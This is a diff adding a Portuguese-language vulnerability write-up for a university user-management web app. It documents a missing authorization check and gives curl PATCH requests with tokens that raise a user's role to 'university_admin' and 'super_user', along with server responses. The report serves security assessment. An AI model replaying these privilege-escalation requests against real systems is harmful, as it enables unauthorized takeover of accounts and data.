@@ -61,6 +61,107 @@ Exemplo:
 2 - 75d97f9d0471367134110e380b4ad1fdd6b71f17  
 3 - b857b771e690b73f2d96f6c2042a29ba004ed201
 
+# Vulnerabilidade encontrada
+
+Foi identificado que é possível alterar a autorização de um usuário por meio de 
+um acesso não autorizado. Por exemplo, um usuário com perfil operacional consegue 
+alterar seu tipo para "gestor", o que não deveria ocorrer.
+
+## Exemplo de Comportamento Inesperado
+
+Ao acessar o perfil de um usuário operacional, recebemos a seguinte resposta do 
+servidor. Podemos observar que, no campo `"type"`, o valor é `"university_user"`. 
+Isso nos permite deduzir que o tipo `"university_admin"` possui mais privilégios.
+
+```json
+{
+  "id": 2,
+  "url": "http://localhost:8000/api/users/2/",
+  "firstName": "João",
+  "lastName": "da Silva",
+  "universityName": "UFMG - Universidade Federal de Minas Gerais",
+  "email": "admin@ufmg.br",
+  "type": "university_user",
+  "accountPasswordStatus": "OK",
+  "haveResetPasswordTokenEnable": false,
+  "createdOn": "2024-12-09T19:07:21.310022"
+}
+```
+
+É possível alterar esse atributo do usuário, especificamente o campo "type", 
+enviando uma requisição PATCH para a mesma URL que foi utilizada para o GET do 
+usuário, com o corpo da requisição contendo o valor "type": "super_user".
+
+## Exemplo de Requisição curl para Alteração:
+```
+curl --location --request PATCH 'http://localhost:8000/api/university-user/2/' \
+--header 'Referer: http://localhost:3000/' \  
+--header 'authorization: Token 634363bf594831b3f23e01da566436b13ddb5b8d' \  
+--data '{
+    "type":"university_admin"
+}'  
+``` 
+Ao realizar essa requisição, recebemos o status HTTP 200 OK e, ao atualizar a 
+página, o perfil do usuário é alterado para uma nova Role/autorização de "gestor".
+
+### Resposta do Servidor:
+
+```json
+{
+    "id": 2,
+    "url": "http://localhost:8000/api/university-user/2/",
+    "firstName": "João",
+    "lastName": "da Silva",
+    "email": "admin@ufmg.br",
+    "type": "university_admin",
+    "createdOn": "2024-12-09T19:07:21.310022",
+    "university": 1
+}
+```
+Agora, o usuário tem privilégios de gestão, podendo criar novos usuários com 
+permissões de "gestor", gerenciar as pessoas da universidade e realizar todas 
+as ações que um gestor pode executar no aplicativo, mesmo sem ter a autorização 
+adequada. Esse comportamento ocorre porque a rota não verifica a autorização do 
+usuário antes de permitir a alteração do valor do campo "type". Isso configura 
+uma vulnerabilidade grave em qualquer sistema.
+
+## Alteração para Super Usuário
+
+Além disso, é possível alterar o tipo de usuário para "super_user", o que concede 
+a capacidade de gerenciar pessoas de todas as instituições e 
+até mesmo as próprias instituições.
+
+### Exemplo de Requisição curl para Elevar para Super Usuário:
+```
+curl --location --request PATCH 'http://localhost:8000/api/university-user/2/' \
+--header 'Referer: http://localhost:3000/' \
+--header 'authorization: Token 8f533fa75dc1ab6af3dabf1fbdf166c28a38ba48' \
+--header 'Content-Type: application/json' \
+--data '{
+    "type":"super_user"
+}'
+```
+Essa vulnerabilidade é extremamente crítica, pois permite que usuários não 
+autorizados assumam funções administrativas e ganhem controle sobre todos 
+os dados e operações do sistema.
 # Conclusão
 
-A análise de vulnerabilidades de autenticação mostrou-se limitada devido a falhas no recebimento de e-mails cruciais para a execução de testes como brute-force e a análise de tokens. Além disso, o sistema em questão adota boas práticas de segurança, como o uso de tokens altamente aleatórios, o que torna ataques de manipulação e brute-force ineficazes. Outro ponto importante foi a utilização de mensagens genéricas no caso de erro de autenticação, como "e-mail não cadastrado e/ou senha inválida". Essa abordagem impede a enumeração de usuários e dificulta a aplicação de ataques de força bruta, já que não é possível distinguir se o erro ocorreu devido a um usuário inexistente ou uma senha incorreta. Essas medidas contribuem para a segurança geral do sistema, tornando-o mais resistente a tentativas de acesso não autorizado.
+A análise de vulnerabilidades de autenticação mostrou-se limitada devido a falhas 
+no recebimento de e-mails cruciais para a execução de testes como brute-force e a 
+análise de tokens. Além disso, o sistema em questão adota boas práticas de segurança, 
+como o uso de tokens altamente aleatórios, o que torna ataques de manipulação e
+brute-force ineficazes. Outro ponto importante foi a utilização de mensagens genéricas 
+no caso de erro de autenticação, como "e-mail não cadastrado e/ou senha inválida".
+Essa abordagem impede a enumeração de usuários e dificulta a aplicação de ataques 
+de força bruta, já que não é possível distinguir se o erro ocorreu devido a um usuário 
+inexistente ou uma senha incorreta. Essas medidas contribuem para a segurança geral do 
+sistema, tornando-o mais resistente a tentativas de acesso não autorizado.
+
+Entretanto, foi identificada uma vulnerabilidade grave relacionada à falta de verificação 
+de autorização antes de alterar os privilégios de usuários. A manipulação do campo "type" 
+permite que usuários não autorizados elevem seus próprios privilégios para "gestor" ou até 
+"super usuário", o que pode comprometer o controle e a segurança do sistema. Essa falha expõe 
+o sistema a um risco significativo, permitindo que qualquer usuário com acesso básico altere suas 
+permissões, resultando em um controle indevido sobre as operações do sistema e afetando toda a gestão 
+de usuários e dados sensíveis.
+
